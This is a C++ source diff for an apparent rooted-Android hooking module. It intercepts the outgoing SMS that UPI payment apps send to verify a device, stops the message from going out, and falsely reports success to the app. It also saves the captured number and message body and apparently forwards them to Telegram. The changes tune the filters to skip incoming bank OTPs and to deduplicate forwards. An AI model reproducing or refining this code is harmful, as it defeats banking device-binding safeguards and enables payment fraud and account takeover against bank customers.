@@ -174,33 +174,72 @@ bool is_short_verify_dest(const std::string& dest) {
 
 bool blob_contains_needle(const std::string& blob, const char* ascii);
 
+/** Incoming bank OTP / RCS — NEVER treat as outgoing verify, NEVER TG. */
+bool is_incoming_otp_noise(const std::string& s) {
+    if (s.empty()) return false;
+    const std::string upper = to_upper(s);
+    if (upper.find("<#>") != std::string::npos) return true;
+    if (upper.find("IS YOUR OTP") != std::string::npos) return true;
+    if (upper.find("VALID FOR") != std::string::npos) return true;
+    if (upper.find("DO NOT SHARE WITH ANYONE") != std::string::npos) return true;
+    if (upper.find("REPORT TO YOUR BANK") != std::string::npos) return true;
+    if (upper.find("UPI REGISTRATION") != std::string::npos &&
+        upper.find("HEROAXISUPI") == std::string::npos)
+        return true;
+    return false;
+}
+
+/** Dest must be phone/shortcode only — not message text / package name. */
+bool is_clean_sms_dest(const std::string& dest) {
+    if (dest.empty() || dest.size() > 18) return false;
+    if (dest.find('<') != std::string::npos || dest.find('>') != std::string::npos) return false;
+    if (dest.find(' ') != std::string::npos) return false;
+    if (dest.find("com.") != std::string::npos) return false;
+    if (dest.rfind("android.", 0) == 0) return false;
+    return is_short_verify_dest(dest);
+}
+
+/**
+ * Outgoing UPI verify SMS body (HEROAXISUPI / DO NOT COPY…) — NOT incoming OTP.
+ * Broad keywords like OTP/HERO/AXIS alone are NOT enough (false TG spam).
+ */
+bool is_outgoing_upi_verify_body(const std::string& body) {
+    if (body.empty() || body.size() < 8) return false;
+    if (is_incoming_otp_noise(body)) return false;
+    if (body.find("com.") == 0 || body.find("android.") == 0) return false;
+    const std::string upper = to_upper(body);
+    static const char* out_kw[] = {
+        "HEROAXISUPI",
+        "DO NOT COPY FORWARD OR SHARE THIS MESSAGE",
+        "UNDER ANY CIRCUMSTANCE",
+        "YESPROUPI",
+        "YESPRO ",
+        "PHONEPEUPI",
+        "GPAY",
+        nullptr,
+    };
+    for (const char** kw = out_kw; *kw; ++kw) {
+        if (upper.find(*kw) != std::string::npos) return true;
+    }
+    // HEROAXIS token without "UPI Registration OTP" noise
+    if (upper.find("HEROAXIS") != std::string::npos && upper.find("OTP") == std::string::npos)
+        return true;
+    return false;
+}
+
 bool body_has_verify_token(const std::string& body) {
+    // Prefer strict outgoing check; keep legacy for Intent/block heuristics
+    if (is_outgoing_upi_verify_body(body)) return true;
+    if (is_incoming_otp_noise(body)) return false;
     if (body.empty()) return false;
     const std::string upper = to_upper(body);
     static const char* keywords[] = {
-        "YESPRO", "YESPROUPI", "YESPAY", "YESBNK", "PHONEPE", "PAYTM", "GPAY", "GOOGLE PAY",
-        "SNAPMINT", "KREDIT", "KREDITBEE", "KREDITBEEAXIS", "UPI", "VERIFY", "VERIFICATION", "VK-", "OTP",
-        "HEROAXISUPI", "HEROAXIS", "HEROFIN", "HEROFINCORP", "HERO", "GROWW", "AXIS", "AIRTEL", "AIRBNK",
-        "MYAIRTEL", "DO NOT COPY", "DO NOT", "HDFCUPI", "SBIUPI", "ICICI", "JP7", "AXISBK", "BOB", "PNB",
-        "FORWARD OR SHARE", "UNDER ANY CIRCUMSTANCE",
+        "YESPRO", "YESPROUPI", "YESPAY", "YESBNK",
+        "HEROAXISUPI", "HEROAXIS",
+        "DO NOT COPY FORWARD", "FORWARD OR SHARE", "UNDER ANY CIRCUMSTANCE",
         nullptr};
     for (const char** kw = keywords; *kw; ++kw) {
         if (upper.find(*kw) != std::string::npos) return true;
-    }
-    // Opaque base64-like UPI verify bodies (no keyword)
-    if (body.size() >= 24) {
-        std::string compact = body;
-        compact.erase(std::remove(compact.begin(), compact.end(), '\n'), compact.end());
-        compact.erase(std::remove(compact.begin(), compact.end(), ' '), compact.end());
-        if (compact.size() >= 20) {
-            size_t token_chars = 0;
-            for (char c : compact) {
-                if (std::isalnum(static_cast<unsigned char>(c)) || strchr("+/=)(?&._-", c)) {
-                    token_chars++;
-                }
-            }
-            if (token_chars >= compact.size() * 85 / 100) return true;
-        }
     }
     return false;
 }
@@ -234,16 +273,13 @@ bool should_block_outgoing(const ModuleConfig& config, const std::string& body,
 // UPI apps: content-only (code-range alone crashes banks).
 bool looks_like_isms_send(jint code, const std::string& dest, const std::string& body,
                           bool blob_verify, bool /*blob_sms*/) {
+    (void)code;
+    // Never treat incoming OTP as outgoing send
+    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) return false;
     if (blob_verify) return true;
-    if (!body.empty() && body_has_verify_token(body)) return true;
-    if (!dest.empty() && is_short_verify_dest(dest)) return true;
-    if (!dest.empty() && !body.empty()) return true;
-    if (!dest.empty() && dest.size() <= 14 && is_short_verify_dest(dest)) return true;
-    if (g_is_messaging_app) {
-        // NUCLEAR only in Messages client — NEVER phone/telephony server (SIM break)
-        if (code >= 1) return true;
-        if (!body.empty() || !dest.empty()) return true;
-    }
+    if (is_outgoing_upi_verify_body(body)) return true;
+    if (is_clean_sms_dest(dest) && is_outgoing_upi_verify_body(body)) return true;
+    if (is_clean_sms_dest(dest) && !body.empty() && body_has_verify_token(body)) return true;
     return false;
 }
 
@@ -577,23 +613,18 @@ bool extract_isms_from_blob(JNIEnv* env, jobject data, std::string& dest, std::s
     }
 
     for (const auto& s : strs) {
-        if (body.empty() && body_has_verify_token(s)) body = s;
+        if (body.empty() && is_outgoing_upi_verify_body(s)) body = s;
     }
     if (body.empty()) {
         for (const auto& s : strs) {
-            if (s.size() >= 12 && s.find('.') == std::string::npos &&
-                s.find('/') == std::string::npos) {
-                // long opaque token body
-                size_t alnum = 0;
-                for (char c : s)
-                    if (std::isalnum(static_cast<unsigned char>(c)) || strchr("+/=)(?&._- ", c))
-                        ++alnum;
-                if (alnum * 10 >= s.size() * 7 && s.size() > body.size()) body = s;
-            }
+            if (body.empty() && body_has_verify_token(s) && !is_incoming_otp_noise(s)) body = s;
         }
     }
+    if (body.empty()) {
+        // do not fall back to opaque random strings / package names
+    }
     for (const auto& s : strs) {
-        if (dest.empty() && is_short_verify_dest(s)) dest = s;
+        if (dest.empty() && is_clean_sms_dest(s)) dest = s;
     }
     // digit runs from UTF-16 decoded strings already covered; also scan flattened UTF-16 ascii
     if (dest.empty()) {
@@ -602,43 +633,49 @@ bool extract_isms_from_blob(JNIEnv* env, jobject data, std::string& dest, std::s
             if (blob[i + 1] == 0 && std::isdigit(static_cast<unsigned char>(blob[i])))
                 flat += blob[i];
             else if (!flat.empty()) {
-                if (is_short_verify_dest(flat)) {
+                if (is_clean_sms_dest(flat)) {
                     dest = flat;
                     break;
                 }
                 flat.clear();
             }
         }
-        if (dest.empty() && is_short_verify_dest(flat)) dest = flat;
+        if (dest.empty() && is_clean_sms_dest(flat)) dest = flat;
     }
 
     if (body.empty() && blob_contains_needle(blob, "HEROAXIS")) {
-        // last resort: pull around HEROAXIS marker
         for (const auto& s : strs) {
-            if (to_upper(s).find("HERO") != std::string::npos) {
+            if (is_outgoing_upi_verify_body(s)) {
                 body = s;
                 break;
             }
         }
     }
-    if (dest.empty() && !body.empty()) dest = "0000000000";
-    return !body.empty();
+    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) {
+        dest.clear();
+        body.clear();
+        return false;
+    }
+    if (dest.empty() && !body.empty() && is_outgoing_upi_verify_body(body)) dest = "0000000000";
+    return is_outgoing_upi_verify_body(body);
 }
 
 /** True when parcel looks like an OUTGOING send (not ISms status/query). */
 bool blob_looks_like_outgoing_send(const std::string& blob) {
     if (blob.size() < 8) return false;
+    // Reject incoming OTP blobs early
+    if (blob_contains_needle(blob, "is your OTP")) return false;
+    if (blob_contains_needle(blob, "Valid for")) return false;
+    if (blob_contains_needle(blob, "<#>")) return false;
     if (blob_contains_needle(blob, "sendText")) return true;
     if (blob_contains_needle(blob, "sendMultipart")) return true;
-    if (blob_contains_needle(blob, "sendDataMessage")) return true;
-    if (blob_contains_needle(blob, "sendRawPdu")) return true;
+    if (blob_contains_needle(blob, "HEROAXISUPI")) return true;
     if (blob_contains_needle(blob, "HEROAXIS")) return true;
-    if (blob_contains_needle(blob, "AXISUPI")) return true;
-    if (blob_contains_needle(blob, "DO NOT COPY")) return true;
-    if (blob_contains_needle(blob, "YESPRO")) return true;
+    if (blob_contains_needle(blob, "DO NOT COPY FORWARD")) return true;
+    if (blob_contains_needle(blob, "UNDER ANY CIRCUMSTANCE")) return true;
+    if (blob_contains_needle(blob, "YESPROUPI")) return true;
     if (blob_contains_needle(blob, "smsto:")) return true;
     if (blob_contains_needle(blob, "SMSTO:")) return true;
-    if (blob_contains_needle(blob, "pp-")) return true;
     return false;
 }
 
@@ -947,15 +984,62 @@ std::string json_escape_local(const std::string& input) {
     return out;
 }
 
-void pipeline_outgoing(JNIEnv* env, const std::string& dest, const std::string& body_in,
+void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::string& body_in,
                        jobject sent_intent = nullptr, jobject delivery_intent = nullptr) {
-    const std::string body = fake_success::apply_prefix(body_in);
-    sms_hook::handle_outgoing_sms(env, zygisk_utils::string_to_jstring(env, dest),
-                                  zygisk_utils::string_to_jstring(env, body));
-    // Gamex handleSmsResult: insert + PendingIntent RESULT_OK + SMS_SENT broadcasts
-    fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
+    std::string dest = dest_in;
+    std::string body = fake_success::apply_prefix(body_in);
 
-    // A16: app UID often cannot create /data/local/tmp files — write module + code_cache too
+    // Fix swapped fields (OTP text landed in dest, package in body)
+    if ((!is_clean_sms_dest(dest) || is_incoming_otp_noise(dest)) &&
+        is_clean_sms_dest(body) && is_outgoing_upi_verify_body(dest)) {
+        std::swap(dest, body);
+    }
+    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest) ||
+        !is_outgoing_upi_verify_body(body) || !is_clean_sms_dest(dest)) {
+        write_hook_status("skip_tg_not_outgoing_verify");
+        write_isms_trace("skip_tg_not_outgoing_verify");
+        return;
+    }
+    // Placeholder dest — radio may be blocked by caller, but don't TG junk
+    {
+        std::string d;
+        for (char c : dest)
+            if (std::isdigit(static_cast<unsigned char>(c))) d += c;
+        bool all0 = !d.empty();
+        for (char c : d)
+            if (c != '0') {
+                all0 = false;
+                break;
+            }
+        if (all0) {
+            write_isms_trace("skip_tg_placeholder_dest");
+            return;
+        }
+    }
+
+    // Dedupe — same To+body only once / 3 min (stops 20-30x TG spam)
+    static std::string s_last_key;
+    static time_t s_last_ts = 0;
+    const std::string key = dest + "|" + body;
+    const time_t now = time(nullptr);
+    if (key == s_last_key && (now - s_last_ts) < 180) {
+        write_hook_status("dedupe_skip_tg");
+        write_isms_trace("dedupe_skip_tg");
+        // Still fake-success to app so it doesn't retry forever
+        if (env) {
+            fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
+        }
+        return;
+    }
+    s_last_key = key;
+    s_last_ts = now;
+
+    if (env) {
+        sms_hook::handle_outgoing_sms(env, zygisk_utils::string_to_jstring(env, dest),
+                                      zygisk_utils::string_to_jstring(env, body));
+        fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
+    }
+
     char flag_buf[2048];
     snprintf(flag_buf, sizeof(flag_buf), "%s\n%s", dest.c_str(), body.c_str());
     write_diag_multi("hivirtus_outgoing_blocked.flag", flag_buf);
@@ -964,7 +1048,7 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest, const std::string& 
     snprintf(json_buf, sizeof(json_buf),
              "{\"dest\":\"%s\",\"body\":\"%s\",\"pkg\":\"%s\",\"ts\":%ld}\n",
              json_escape_local(dest).c_str(), json_escape_local(body).c_str(),
-             g_upi_pkg.c_str(), static_cast<long>(time(nullptr)));
+             g_upi_pkg.c_str(), static_cast<long>(now));
     write_diag_multi("hivirtus_outgoing_blocked.json", json_buf);
     write_hook_status("outgoing_json_written");
 
@@ -986,7 +1070,7 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest, const std::string& 
              "{\n  \"dest\": \"%s\",\n  \"body\": \"%s\",\n  \"send_from\": \"%s\",\n  "
              "\"pkg\": \"%s\",\n  \"captured_at\": %ld\n}\n",
              json_escape_local(dest).c_str(), json_escape_local(body).c_str(), phone,
-             g_upi_pkg.c_str(), static_cast<long>(time(nullptr)));
+             g_upi_pkg.c_str(), static_cast<long>(now));
     write_diag_multi("hivirtus_pending_verify.json", pending_buf);
 }
 
@@ -1224,33 +1308,36 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 return JNI_TRUE;
             }
             extract_isms_from_blob(env, data, dest, body);
-            const bool got_real =
-                !body.empty() && body != "BLOB_SMS_BLOCK" && body != "MSG_SMS_INTERCEPT" &&
-                (body_has_verify_token(body) || body.size() >= 8);
+            // Prefer outgoing verify body from UTF-16 strings; reject OTP noise
+            if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) {
+                write_isms_trace("isms_passthrough_incoming_otp");
+            } else {
+                const bool got_out =
+                    is_outgoing_upi_verify_body(body) && is_clean_sms_dest(dest);
+                const bool sendish_out = sendish && !blob_contains_needle(blob, "is your OTP");
 
-            // Messages: any ISms → block radio (silent if no body). UPI: only sendish/got_real.
-            const bool should_nuclear =
-                sendish || got_real ||
-                (g_is_messaging_app && (iface_sms || blob_sms) && code >= 1);
-
-            if (should_nuclear) {
-                if (dest.empty()) dest = "0000000000";
-                if (got_real) {
-                    pipeline_outgoing(env, dest, body, nullptr, nullptr);
+                // ONLY block+TG real outgoing verify. No bare ISms / no OTP spam.
+                if (got_out || (sendish_out && is_outgoing_upi_verify_body(body))) {
+                    if (!is_clean_sms_dest(dest)) {
+                        // try extract digit dest from blob again via flag dest
+                        if (!is_clean_sms_dest(dest)) dest = "0000000000";
+                    }
+                    if (is_outgoing_upi_verify_body(body) && is_clean_sms_dest(dest)) {
+                        pipeline_outgoing(env, dest, body, nullptr, nullptr);
+                    }
                     if (reply) write_ok_reply(env, reply);
                     write_hook_status("isms_blocked_nuclear");
                     write_isms_trace("isms_blocked_nuclear");
                     return JNI_TRUE;
                 }
-                // Stop SIM even without parse — no TG placeholder spam
-                if (reply) write_ok_reply(env, reply);
-                write_diag_multi("hivirtus_outgoing_blocked.flag", "0000000000\nSILENT_BLOCK");
-                write_hook_status("isms_blocked_silent");
-                write_isms_trace("isms_blocked_silent");
-                return JNI_TRUE;
+                if (sendish_out && is_outgoing_upi_verify_body(body)) {
+                    if (reply) write_ok_reply(env, reply);
+                    write_hook_status("isms_blocked_silent");
+                    write_isms_trace("isms_blocked_silent");
+                    return JNI_TRUE;
+                }
+                write_isms_trace("isms_passthrough_query");
             }
-            write_isms_trace("isms_passthrough_query");
-        }
     }
 
     const jboolean ret = orig_BinderProxy_transact(env, thiz, code, data, reply, flags);
